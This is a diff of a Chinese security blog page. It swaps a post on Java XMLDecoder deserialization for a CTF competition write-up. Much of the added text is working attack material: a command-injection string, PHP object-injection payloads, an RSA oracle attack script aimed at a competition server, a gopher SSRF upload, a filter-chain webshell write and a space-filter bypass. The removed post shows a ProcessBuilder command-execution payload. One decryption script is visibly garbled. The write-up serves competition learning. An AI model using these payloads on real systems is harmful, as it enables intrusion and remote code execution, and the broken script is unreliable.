@@ -4,7 +4,7 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="XMLDecoder反序列化, Fortheone">
+    <meta name="keywords" content="强网杯writeup, Fortheone">
     <meta name="description" content>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>XMLDecoder反序列化 | Fortheone</title>
+    <title>强网杯writeup | Fortheone</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -281,12 +281,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">XMLDecoder反序列化</h1>
+                    <h1 class="description center-align post-title">强网杯writeup</h1>
                 </div>
             </div>
         </div>
@@ -411,8 +411,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/总结记录/" class="post-category">
-                                总结记录
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
                             </a>
                         
                     </div>
@@ -424,7 +424,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-08-12
+                    2020-08-26
                 </div>
                 
 
@@ -433,14 +433,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    1.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    6 分
                 </div>
                 
 
@@ -456,144 +456,462 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="前言">前言</h3>
-<p>最近学习java反序列化学到了weblogic部分，weblogic之前的两个反序列化漏洞不涉及T3协议之类的，只是涉及到了XMLDecoder反序列化导致漏洞，但是网上大部分的文章都只讲到了触发XMLDecoder部分就结束了，并没有讲为什么XMLDecoder会触发反序列化导致命令执行。于是带着好奇的我就跟着调了一下XMLDecoder的反序列化过程。</p>
-<h3 id="xml序列化">xml序列化</h3>
-<p>首先了解一下java中的XMLDecoder是什么。XMLDecoder就是jdk中一个用于处理xml数据的类，先看两个例子。</p>
-<p>这里引用一下浅蓝表哥的（强推浅蓝表哥的博客https://b1ue.cn/</p>
-<pre><code>import java.beans.XMLEncoder;
-import java.io.IOException;
-import java.util.ArrayList;
-import java.util.HashMap;
-
-/**
- * @author 浅蓝
- * @email blue@ixsec.org
- * @since 2019/4/24 12:09
- */
-public class Test {
-
-    public static void main(String[] args) throws IOException, InterruptedException {
-
-        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
-        map.put(&quot;123&quot;,&quot;aaaa&quot;);
-        map.put(&quot;321&quot;,new ArrayList&lt;&gt;());
-
-        XMLEncoder xmlEncoder = new XMLEncoder(System.out);
-        xmlEncoder.writeObject(map);
-        xmlEncoder.close();
-
-    }
-}
+                <h2 id="一、战队信息">一、<strong>战队信息</strong></h2>
+<p>战队名称：低级CTF团队</p>
+<p>战队排名：63</p>
+<h2 id="二、解题情况">二、<strong>解题情况</strong></h2>
+<p><img src="https://images-cdn.shimo.im/za0dMJee9bklsjLk__thumbnail" alt></p>
+<h2 id="三、解题过程">三、<strong>解题过程</strong></h2>
+<h2 id="强网先锋">强网先锋</h2>
+<h3 id="upload">upload</h3>
+<p><img src="https://images-cdn.shimo.im/PXj3esZLg2ZL0lrC__thumbnail.png" alt></p>
+<p>打开流量包发现上传了个图片文件，导出图片。</p>
+<p>根据图片名 steghide可以知道应该是steghide加密，但是不知道密码。</p>
+<p><img src="https://images-cdn.shimo.im/X6EiX8WiTmYckWbg__thumbnail.png" alt></p>
+<p>另一个包里提示了这么一句话，猜测密码是弱口令。</p>
+<p><img src="https://images-cdn.shimo.im/kVt6sQDS4rq0y8fb__thumbnail.png" alt></p>
+<p>测出密码是123456</p>
+<p><img src="https://images-cdn.shimo.im/T70C7IjXL4YUoBnY__thumbnail.png" alt></p>
+<h3 id="主动">主动</h3>
+<p><img src="https://images-cdn.shimo.im/GoJtlH1DJYcwTTO1__thumbnail.png" alt></p>
+<p>命令执行</p>
+<p>?ip=127.0.0.1;cat%20./fla[f-h].php</p>
+<p><img src="https://images-cdn.shimo.im/T2iy783SHoTnp5kc__thumbnail.png" alt></p>
+<h3 id="Funhash">Funhash</h3>
+<p><img src="https://images-cdn.shimo.im/wborPMezlWPXn3xV__thumbnail.png" alt></p>
+<p>第一关</p>
+<p><img src="https://images-cdn.shimo.im/tiBHE8I1rewxscWm__thumbnail.png" alt></p>
+<p>第二关用数组绕过</p>
+<p>第三关ffifdyop即可</p>
+<p>最终payload</p>
+<p>?hash1=0e001233333333333334557778889&amp;hash2[]=1&amp;hash3[]=2&amp;hash4=ffifdyop</p>
+<p><img src="https://images-cdn.shimo.im/YfGLO95mlzQphu8s__thumbnail.png" alt></p>
+<h3 id="web辅助">web辅助</h3>
+<p><img src="https://images-cdn.shimo.im/BnER6akjjnWnEuVE__thumbnail.png" alt></p>
+<p><img src="https://images-cdn.shimo.im/cTzP11gurZfr46gt__thumbnail.png" alt></p>
+<p><img src="https://images-cdn.shimo.im/pPRagByQaMS3bvJc__thumbnail.png" alt></p>
+<p>php反序列化字符逃逸 dasctf六月赛差不多的题</p>
+<p>构造payload</p>
+<p>username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&amp;password=1&quot;;S:7:&quot;\00*\00pass&quot;;O:7:“topsolo”:2:{S:7:&quot;\00*\00\6E\61\6d\65&quot;;O:7:“midsolo”:2:{S:7:&quot;\00*\00\6E\61\6d\65&quot;;O:6:“jungle”:2:{S:7:&quot;\00*\00\6E\61\6d\65&quot;;s:0:&quot;&quot;;}}};S:8:&quot;\00*\00admin&quot;;i:0;}</p>
+<p>最后一定要补上admin属性，不然会报错。</p>
+<p>使password字段逃逸出来为对象即可反序列化执行cat /flag命令。</p>
+<h3 id="侧防">侧防</h3>
+<p>输入flag，加密后比对</p>
+<p><img src="https://images-cdn.shimo.im/V7BVxb7zSZufcV5m__thumbnail.png" alt></p>
+<p>加密函数</p>
+<p><img src="https://images-cdn.shimo.im/CJrb6YVfYsyNgUGc__thumbnail.png" alt></p>
+<pre class=" language-language-plain"><code class="language-language-plain">a=[0x51,0x57,0x42,0x6c,0x6f,0x67,0x73]
+c=[76, 120, 124, 100, 84, 85, 119, 101, 92, 73, 118, 78, 104, 67, 66, 79, 76, 113, 68, 78, 102, 87, 125, 73, 109, 70, 90, 67, 116, 105, 121, 120, 79, 92, 80, 87, 94, 101, 98, 68]
+for i in range(0,len(c),4):
+	cc=c[i]
+	c[i]=c[i+1]
+	c[i+1]=c[i+2]
+	c[i+2]=c[i+3]
+	c[i+3]=cc
+print c
+f=""
+for i in range(0,len(c)):
+	f+=chr(((c[i]-65)^a[i%7])%256)
+print f
 </code></pre>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/QQ%E6%88%AA%E5%9B%BE20200812162448.png" alt></p>
-<p>这样就把map对象变成了xml数据，再使用XMLDecoder解析一下。</p>
-<pre><code>/**
- * @author 浅蓝
- * @email blue@ixsec.org
- * @since 2019/4/24 12:09
- */
-public class Test {
+<p><img src="https://images-cdn.shimo.im/nkqJ7HUkHuSMEQAN__thumbnail.png" alt></p>
+<p>猜了下，最后一个单词应该为score，所以flag为flag{QWB_water_problem_give_you_the_score} ，提交正确</p>
+<h3 id="红方辅助">红方辅助</h3>
+<p><a href="http://xn--client-hp7ix6as5p959h.py" target="_blank" rel="noopener">先看了下client.py</a>，大致意思是每一次加密以G为开始信号，然后接受服务端的时间，再根据fn与offset相减，最后再根据fn执行不同的计算。</p>
+<p>先把流量包的data数据提出来</p>
+<p>提取脚本</p>
+<pre class=" language-language-plain"><code class="language-language-plain">import pyshark
+cap=pyshark.FileCapture('enc.pcapng')
+f=open('data','w')
+for pkt in cap:
+	if 'TCP' in pkt and 'SSH' not in pkt:
+		tcp=pkt.tcp
+		#print(tcp)
+		if 'payload' in dir(tcp):
+			f.write(tcp.payload+'\n')
+		#pause
+</code></pre>
+<p>提取出来的数据<br>
+<img src="https://images-cdn.shimo.im/qRoXgegn7NGL3BrL__thumbnail.png" alt></p>
+<p>再根据加密算法写出解密脚本，解密脚本如下</p>
+<pre class=" language-language-plain"><code class="language-language-plain">import struct
+import binascii
+f=open('data','r')
+enc=[]
+btime=[]
+salt=[]
+fn=[]
+fin=f.read().split('\n')
+for i in range(0,len(fin)):
+fin[i]=fin[i].replace(':','')
+#print fin[i]
+for i in range(0,len(fin)-1,5):
+btime.append(binascii.a2b_hex(fin[i+1]))
+print fin[i+3][:10]
+enc.append(binascii.a2b_hex(fin[i+3])[10:-2])
+z5=struct.unpack("<iicb",binascii.a2b_hex(fin[i+3])[:10]) fn.append(z5[2]) salt.append(z5[3]) funcs="{" "0" : lambda x, y x + y, "1" - "2" ^ } offset="{" 0xefffff, 0xffffff, for j in range(0,len(enc)): boffset="offset[fn[j].decode()]" t="struct.unpack(" <i"," btime[j])[0] t) #print ord(t[0]) m i enc[j]: sd="(funcs[fn[j].decode()])(ord(i)^ord(t[y]),salt[j])%256" m+="chr(sd)" m.encode('hex') zy="m[:4]" m1 m: if not zy: else: range(0,4): ') try print ' except: continue < code></iicb",binascii.a2b_hex(fin[i+3])[:10])></code></pre>
+<p>运行结果<br>
+<img src="https://images-cdn.shimo.im/0CJyoYzvsnlqfxp7__thumbnail" alt></p>
+<p>最终flag为QWB{3e752bf509ddb4e9a42f1ef30beff495}</p>
+<h3 id="baby-crt">baby_crt</h3>
+<pre class=" language-language-plain"><code class="language-language-plain">这个跟crt有关，就找到一个有关的pdf，直接用就可以了![图片](https://uploader.shimo.im/f/PwtsjUoTNL0K0HpZ.png!thumbnail)
+</code></pre>
+<pre class=" language-language-python"><code class="language-language-python">#直接爆破C
+import gmpy2
+from Crypto.Util.number import  long_to_bytes
+from hashlib import sha1
+e=65537
+n=26318358382258215770827770763384603359524444566146134039272065206657135513496897321983920652242182112479484135343436206815722605756557098241887233837248519031879444740922789351356138322947108346833956405647578838873425658405513192437479359531790697924285889505666769580176431360506227506064132034621123828090480606055877425480739950809109048177976884825589023444901953529913585288143291544181183810227553891973915960951526154469344587083295640034876874318610991153058462811369615555470571469517472865469502025030548451296909857667669963720366290084062470583318590585472209798523021029182199921435625983186101089395997
 
-    public static void main(String[] args) throws IOException, InterruptedException {
-        String s = &quot;&lt;java version=\&quot;1.8.0_131\&quot; class=\&quot;java.beans.XMLDecoder\&quot;&gt;\n&quot; +
-                &quot; &lt;object class=\&quot;java.util.HashMap\&quot;&gt;\n&quot; +
-                &quot;  &lt;void method=\&quot;put\&quot;&gt;\n&quot; +
-                &quot;   &lt;string&gt;123&lt;/string&gt;\n&quot; +
-                &quot;   &lt;string&gt;aaaa&lt;/string&gt;\n&quot; +
-                &quot;  &lt;/void&gt;\n&quot; +
-                &quot;  &lt;void method=\&quot;put\&quot;&gt;\n&quot; +
-                &quot;   &lt;string&gt;321&lt;/string&gt;\n&quot; +
-                &quot;   &lt;object class=\&quot;java.util.ArrayList\&quot;/&gt;\n&quot; +
-                &quot;  &lt;/void&gt;\n&quot; +
-                &quot; &lt;/object&gt;\n&quot; +
-                &quot;&lt;/java&gt;&quot;;
-        StringBufferInputStream stringBufferInputStream = new StringBufferInputStream(s);
-        XMLDecoder xmlDecoder = new XMLDecoder(stringBufferInputStream);
-        Object o = xmlDecoder.readObject();
-        System.out.println(o);
+m=26275493320706026144196966398886196833815170413807705805287763413013100962831703774640332765503838087434904835657988276064660304427802961609185997964665440867416900711128517859267504657627160598700248689738045243142111489179673375819308779535247214660694211698799461044354352200950309392321861021920968200334344131893259850468214901266208090469265809729514249143938043521579678234754670097056281556861805568096657415974805578299196440362791907408888958917063668867208257370099324084840742435785960681801625180611324948953657666742195051492610613830629731633827861546693629268844700581558851830936504144170791124745540
 
-    }
-}
+sig=20152941369122888414130075002845764046912727471716839854671280255845798928738103824595339885345405419943354215456598381228519131902698373225795339649300359363119754605698321052334731477127433796964107633109608706030111197156701607379086766944096066649323367976786383015106681896479446835419143225832320978530554399851074180762308322092339721839566642144908864530466017614731679525392259796511789624080228587080621454084957169193343724515867468178242402356741884890739873250658960438450287159439457730127074563991513030091456771906853781028159857466498315359846665211412644316716082898396009119848634426989676119219246
+
+for i in range(1,65525):
+p= gmpy2.gcd(pow(m,i,n)-pow(sig,e,n),n)
+if n%p==0 and p!=1:
+      p = n/p
+break
+print "flag{" + sha1(long_to_bytes(p)).hexdigest() + "}"
 </code></pre>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812163341.png" alt></p>
-<p>就可以把之前的xml数据反序列化回map对象，那么如果对xml数据进行修改，使其变成一个执行命令的数据。比如说：</p>
-<pre><code>&lt;java version=&quot;1.7.0_80&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
- &lt;object class=&quot;java.lang.ProcessBuilder&quot;&gt;
-  &lt;array class=&quot;java.lang.String&quot; length=&quot;1&quot;&gt;
-    &lt;void index=&quot;0&quot;&gt;&lt;string&gt;calc&lt;/string&gt;&lt;/void&gt;
-  &lt;/array&gt;
-  &lt;void method=&quot;start&quot;&gt;&lt;/void&gt;
- &lt;/object&gt;
-&lt;/java&gt;
+<pre class=" language-language-plain"><code class="language-language-plain">flag{601cb6f6d990ed5b89cf0de60508a95c07543793}
 </code></pre>
-<p>然后对其反序列化即可执行命令弹出计算器。</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812164302.png" alt></p>
-<p>现在我们知道了如果使用XMLDecoder去反序列化xml数据，数据中包含的命令会被执行。接下来就对其进行分析一下。</p>
-<h3 id="XMLDecoder反序列化漏洞成因">XMLDecoder反序列化漏洞成因</h3>
-<h4 id="一、XML数据解析前的函数处理">一、XML数据解析前的函数处理</h4>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812164537.png" alt></p>
-<p>在readObject处打上断点开始debug</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812164606.png" alt></p>
-<p>进入了parsingComplete方法，跟进。</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812164659.png" alt></p>
-<p>其中使用XMLDecoder的handler属性DocumentHandler的parse方法，并且传入了我们输入的xml数据，跟进。</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812164903.png" alt></p>
-<p>这里调用了SAXParserImpl类的parse方法。</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812165034.png" alt></p>
-<p>然后又进了xmlReader的parse方法。</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812165118.png" alt></p>
-<p>这里又调用了xmlReader父类AbstractSAXParser的parser方法。</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812165405.png" alt></p>
-<p>最后进入了XML11Configuration类的parse方法。</p>
-<h4 id="二、XML数据的处理">二、XML数据的处理</h4>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812165912.png" alt></p>
-<p>在XML11Configuration中进行了很多解析XML之前的操作，我们不去仔细研究，看到处理XML数据的函数scanDocument。跟进查看</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812170018.png" alt></p>
-<p>这个函数通过迭代的方式对XML数据的标签进行解析，网上有些文章写道“解析至END_ELEMENT时跟进调试”，但是我看了一下我这里的END_ELEMENT。</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812170447.png" alt></p>
-<p>里面没有函数可以跟进啊，然后搜了一些其他的文章，是因为jdk版本的问题，处理的逻辑放在了next函数里。在do while循环里跳了大概十次，就开始解析了xml的标签。</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812173204.png" alt></p>
-<p>跳到XMLDocumentScannerImpl中的next方法</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/1597225960902.png" alt></p>
-<p>跳到XMLDocumentFragmentScannerImpl中的next方法，解析到endtag时会走到scanEndElement方法里。</p>
-<p>然后就到了网上说的endElement方法里，跟进。</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812175319.png" alt></p>
-<p>这一部分的解析可以参考下图：</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812175947.png" alt></p>
-<p>也就是说解析时会按照标签一个一个解析。</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812175538.png" alt></p>
-<p>这里调用了DocumentHandler的endElement方法。<strong>接下来就是很重要的部分</strong></p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812180157.png" alt></p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812184547.png" alt></p>
-<p>这里的handler是StringElementHandler，但是这个类没有重写endElement方法，所以调用的是父类ElementHandler的endElement方法，其中调用了getValueObject来获取标签中的value值，这里的标签是string标签，所以获取到的值是calc。</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812190724.png" alt></p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812190823.png" alt></p>
-<p>然后将其添加到其父类标签VoidElementHandler的Argument属性中。</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812190950.png" alt></p>
-<p>然后将handler指向其父类VoidElementHandler。</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812191418.png" alt></p>
-<p>继续解析到void标签，此时的handler就是VoidElementHandler，接着调用getValueObject。但是因为没有重写该方法，所以调用父类NewElementHandler的getValueObject。</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812192219.png" alt></p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812192249.png" alt></p>
-<p>继续跟进发现实现了反射调用invoke方法，也就是执行了set方法。接着再解析Array标签，按照上面的步骤解析，就完成了这一部分参数的解析。</p>
-<pre><code>&lt;array class=&quot;java.lang.String&quot;length=&quot;1&quot;&gt;
-  &lt;void index=&quot;0&quot;&gt;
-      &lt;string&gt;calc&lt;/string&gt;
-  &lt;/void&gt;
-&lt;/array&gt;
+<h2 id></h2>
+<h3 id="-2"></h3>
+<h2 id="WEB">WEB</h2>
+<h3 id="dice2cry">dice2cry</h3>
+<p>访问地址，先提交队伍token</p>
+<p><img src="https://images-cdn.shimo.im/vU2ZXA0QPu0dkR9Y__thumbnail.png" alt></p>
+<p>f12，看了下有个check.php，在这个请求包里给了个rsa密文、n、e。</p>
+<p><img src="https://images-cdn.shimo.im/uwrYmreerLczFYJ1__thumbnail.png" alt></p>
+<p>点一下roll，出了个abi.php</p>
+<p><img src="https://images-cdn.shimo.im/XGojalYuvZo2CRs8__thumbnail.png" alt></p>
+<p>接着看了下，没有其它什么重要的文件显示出来了，可rsa只给了密文和公钥，没给源代码是很难做的，基本只有分解n了，出题人不可能叫我们去分解n，那就一定还有其它文件可以获得源代码，这个文件要么是php文件，并且可以读取其它php的代码并显示出来，要么就是备份文件了，果然，我们在abi.php后加上.bak可以获取到abi.php的备份文件，其中就是源码</p>
+<p><img src="https://images-cdn.shimo.im/JGR8cRxrg8aBFkNv__thumbnail.png" alt></p>
+<p>看了源码，大致知道abi.php的运行思路了，它是接受thi_is.able参赛传过来的c，再解密出明文，然后模3，接着输出返回值。看到这，想起了rsa选择密文攻击，这题我们可以根据明文模3的返回值来进行rsa选择密文攻击。</p>
+<p>最终攻击脚本</p>
+<pre class=" language-language-plain"><code class="language-language-plain">import requests
+rs=requests.Session()
+rs.get("http://106.14.66.189/")
+def getnum(c):
+	data={'this[is.able':c}
+	r2=rs.post("http://106.14.66.189/abi.php",data=data)
+	num=r2.json()['num']
+	return num
+def login():	
+	data={"teamtoken":"icq0ce0d638e0ad716f70a7023c5b563"}
+  r0=rs.post("http://106.14.66.189/check.php",data=data,allow_redirects=False)
+	cflag=int(r0.cookies['encrypto_flag'])
+	n=int(r0.cookies['public_n'],16)
+	e=int(r0.cookies['public_e'],16)
+	return cflag,n,e
+
+c,n,e=login()
+h=n
+l=0
+e3=pow(3,e,n)
+ce=c
+while(h-l>1):
+	ce=(ce*e3)%n
+	num=getnum(ce)
+	m=h-l
+	m=m//3
+	print m
+	if num ==0 :
+		h=h-2*m
+	elif num ==1:
+		l=l+m
+		h=h-m
+	else :
+		l=l+2*m
+print hex(l)[2:-1].decode('hex')
 </code></pre>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812192828.png" alt></p>
-<p>那么再按照上面的步骤解析object标签，然后调用new 方法实例化 ProcessBuilder类。</p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812193210.png" alt></p>
-<p>然后解析到void标签获取到start方法，然后通过调用start方法实现了命令执行，弹出计算器。</p>
-<p>也就相当于最后拼接了 <code>new java.lang.ProcessBuilder(new String[]{&quot;calc&quot;}).start();</code></p>
-<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/fastjson/20200812193412.png" alt></p>
-<p>文章有说的不对的地方请师傅们指点，刚开始学java，大佬们轻喷。。。</p>
-<h3 id="参考文章">参考文章</h3>
-<p><a href="https://b1ue.cn/archives/239.html" target="_blank" rel="noopener">https://b1ue.cn/archives/239.html</a></p>
-<p><a href="https://zhuanlan.zhihu.com/p/108754274" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/108754274</a></p>
-<p><a href="https://blog.csdn.net/SKI_12/article/details/85058040" target="_blank" rel="noopener">https://blog.csdn.net/SKI_12/article/details/85058040</a></p>
+<p><img src="https://images-cdn.shimo.im/46lAcluawlutViwM__thumbnail.png" alt></p>
+<h3 id="half-infiltration">half_infiltration</h3>
+<p><img src="https://images-cdn.shimo.im/hVUsiVUvdiw3NK9o__thumbnail.png" alt></p>
+<p>通过执行 Pass类的read方法即可输出result的值，result在后面被设置为flag，flag是ssrf.php的内容。代码中有个变量覆盖的地方，可以通过第一次覆盖为result，第二次覆盖为this，使其抛出异常，输出ssrf.php的内容。</p>
+<p>x=a:2:{i:0;O:4:“User”:3:{s:3:“age”;O:4:“Pass”:0:{}s:3:“sex”;s:4:“read”;s:3:“num”;s:6:“result”;}i:0;O:4:“User”:3:{s:3:“age”;O:4:“Pass”:0:{}s:3:“sex”;s:4:“read”;s:3:“num”;s:4:“this”;}}</p>
+<p><img src="https://images-cdn.shimo.im/tZnYYOdkEv7RRf64__thumbnail.png" alt></p>
+<p>知道内网的一个端口开放了服务，扫描发现40000端口开放了一个上传文件的功能</p>
+<p><img src="https://images-cdn.shimo.im/QwxaMz71lta8SIfK__thumbnail.png" alt></p>
+<p>ssrf上传文件就是通过gopher的post方法来传文件，然后经提示有uploads目录。发现有很多和phpsessid相似的目录（后面被关了目录遍历看不到了）</p>
+<p>先根据gopher协议构造一个post请求传文件过去吧</p>
+<pre class=" language-language-plain"><code class="language-language-plain">POST / HTTP/1.1
+Host: 127.0.0.1:40000
+Cookie: PHPSESSID=jahr2nhapi2hgbs08676640td2;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 20
+
+file=1.php&content=1
+</code></pre>
+<p>转成gopher形式，要二次url编码！</p>
+<pre class=" language-language-plain"><code class="language-language-plain">gopher://127.0.0.1:40000/_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%33%61%25%33%34%25%33%30%25%33%30%25%33%30%25%33%30%25%30%61%25%34%33%25%36%66%25%36%66%25%36%62%25%36%39%25%36%35%25%33%61%25%32%30%25%35%30%25%34%38%25%35%30%25%35%33%25%34%35%25%35%33%25%35%33%25%34%39%25%34%34%25%33%64%25%36%61%25%36%31%25%36%38%25%37%32%25%33%32%25%36%65%25%36%38%25%36%31%25%37%30%25%36%39%25%33%32%25%36%38%25%36%37%25%36%32%25%37%33%25%33%30%25%33%38%25%33%36%25%33%37%25%33%36%25%33%36%25%33%34%25%33%30%25%37%34%25%36%34%25%33%32%25%33%62%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%32%25%33%30%25%30%61%25%30%61%25%36%36%25%36%39%25%36%63%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30%25%32%36%25%36%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%33%64%25%33%31
+
+</code></pre>
+<p><img src="https://images-cdn.shimo.im/01YJxQKs2IE030Uq__thumbnail.png" alt></p>
+<p>成功传上去了。</p>
+<p>但是后续传php一句话shell的时候却怎么都传不上去，怀疑是有过滤</p>
+<p>fuzz发现过滤了 &lt;? = php &lt;script</p>
+<p>想到用伪协议去写 但是发现还是不行</p>
+<p>然后参考大师傅的博客</p>
+<p><a href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/" target="_blank" rel="noopener">https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/</a></p>
+<p>把各种方法都尝试一遍，然后想到可能是单层的过滤器协议不行，要双重。然后fuzz协议的组合</p>
+<p>最后发现 base64+rot13可以绕过</p>
+<p>file=php://filter//convert.base64-decode|string.rot13|PD9waHAgcGhwaW5mbygpOz8+/resource=2.php&amp;content=PD9jdWMgQHJpbnkoJF9UUkdbJ24nXSk7Pz4</p>
+<p>写入shell以后执行命令</p>
+<p><img src="https://images-cdn.shimo.im/XAZM0Rh2My9DQj3p__thumbnail.png" alt></p>
+<p>没ban system</p>
+<p>但是过滤了空格和flag</p>
+<p>system(%27cat${IFS}/fla[f-h]%27);</p>
+<p>绕一下就行</p>
+<p><img src="https://images-cdn.shimo.im/IQ6US8zF7By5FaGh__thumbnail.png" alt></p>
+<h2 id="RE">RE</h2>
+<h3 id="xx-warmup-obf">xx_warmup_obf</h3>
+<p>ida打开，很多花指令和反调试，尝试去除花指令，发现去掉实在太麻烦了，直接调试，虽然有反调试，但我们可以直接跳过它的死循环，一路下来，找到了check函数，总共有28个字符，进行28次计算，每次对前i个字符进行check，check算法是a[0]*x+a[1]*x+a[2]*x+…+a[i]*x == sum ,x是给定的数，每个相乘的x不一样，sum是比对的值。</p>
+<p>本来想用angr试试能不能跑，但我angr环境被搞坏了，重新配有点麻烦，直接在调试里一个一个撸</p>
+<p><img src="https://images-cdn.shimo.im/9dIVKIyEMjhcZ6p7__thumbnail.png" alt></p>
+<p>花了一个小时撸到最后一个字符了，下面是最后跑最后一个字符的运行结果</p>
+<p><img src="https://images-cdn.shimo.im/yX7ViWyQT6NrRHbh__thumbnail.png" alt></p>
+<p>计算脚本</p>
+<pre class=" language-language-plain"><code class="language-language-plain">f="flag{g0_Fuck_xx_5egm3nt_0bf"
+#f="0"
+
+#print b
+iml=[]
+l=len(f)
+sum=0
+for i in range(0,len(f)+1):
+	n1=raw_input(str(i)+":")#输入x
+	m1=raw_input("idx:")#输入相乘的是第几个
+	iml.append((int(n1[:-1],16),int(m1,16)))	
+	#print iml
+for i in range(0,len(f)):
+	zz=iml[i][1]
+	c="v"+str(iml[i][1])+"=(ord(f["+str(zz)+"])*iml["+str(i)+"][0])&0xffffffff"
+	exec(c)
+	exec("sum=(sum+v"+str(iml[i][1])+")&0xffffffff")
